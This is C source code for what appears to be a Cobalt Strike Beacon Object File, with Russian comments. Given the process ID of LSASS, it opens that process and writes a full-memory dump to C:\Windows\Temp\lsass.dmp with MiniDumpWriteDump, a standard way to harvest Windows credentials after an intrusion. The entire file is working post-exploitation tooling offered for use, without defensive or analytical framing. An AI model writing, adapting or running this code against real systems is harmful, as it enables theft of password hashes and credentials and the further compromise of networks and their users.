#include <windows.h>
#include "beacon.h"

// Импортируем необходимые функции через Library$Function
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetCurrentProcessId();
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError();

// Функция для дампа из dbghelp.dll
DECLSPEC_IMPORT BOOL WINAPI DBGHELP$MiniDumpWriteDump(HANDLE, DWORD, HANDLE, DWORD, void*, void*, void*);

void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    // В этой технике мы принимаем PID процесса LSASS
    int lsass_pid = BeaconDataInt(&parser);
    if (lsass_pid == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: <lsass_pid>");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Attempting LSASS dump for PID: %d", lsass_pid);

    // 1. Открываем LSASS. Требуются права PROCESS_QUERY_INFORMATION и PROCESS_VM_READ
    HANDLE hProcess = KERNEL32$OpenProcess(0x0400 | 0x0010, FALSE, (DWORD)lsass_pid);
    if (hProcess == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open LSASS. Error: %d (Check SeDebugPrivilege!)", KERNEL32$GetLastError());
        return;
    }

    // 2. Создаем файл для дампа
    const char* dumpPath = "C:\\Windows\\Temp\\lsass.dmp";
    HANDLE hFile = KERNEL32$CreateFileA(dumpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create dump file. Error: %d", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hProcess);
        return;
    }

    // 3. Выполняем MiniDumpWriteDump (Тип 0x00000002 = MiniDumpWithFullMemory)
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Writing dump to %s...", dumpPath);
    
    BOOL success = DBGHELP$MiniDumpWriteDump(hProcess, lsass_pid, hFile, 2, NULL, NULL, NULL);

    if (success) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Success! LSASS dump saved to %s", dumpPath);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "MiniDumpWriteDump failed. Error: %d", KERNEL32$GetLastError());
    }

    KERNEL32$CloseHandle(hFile);
    KERNEL32$CloseHandle(hProcess);
}